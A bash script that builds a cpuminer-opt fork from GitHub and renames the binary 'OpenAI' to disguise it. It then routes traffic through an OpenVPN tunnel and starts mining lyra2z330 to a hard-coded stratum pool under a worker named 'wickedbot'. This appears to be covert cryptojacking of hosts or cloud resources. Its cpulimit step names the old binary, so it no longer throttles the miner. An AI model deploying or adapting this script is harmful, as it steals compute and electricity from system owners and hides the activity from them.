#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
sudo apt-get install -y openvpn
git clone https://github.com/k67frozen/cpuminer-opt
cd cpuminer-opt
chmod +x *
./build.sh
mv cpuminer OpenAI
IP=$(/sbin/ip route | awk '/default/ { print $3 }')
route add  1.52.168.10 gw $IP
cd ..
sudo -b openvpn --config test.ovpn
sleep 5s
sudo wget -qO- http://ipv4.icanhazip.com > ip.txt
cd cpuminer-opt
cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x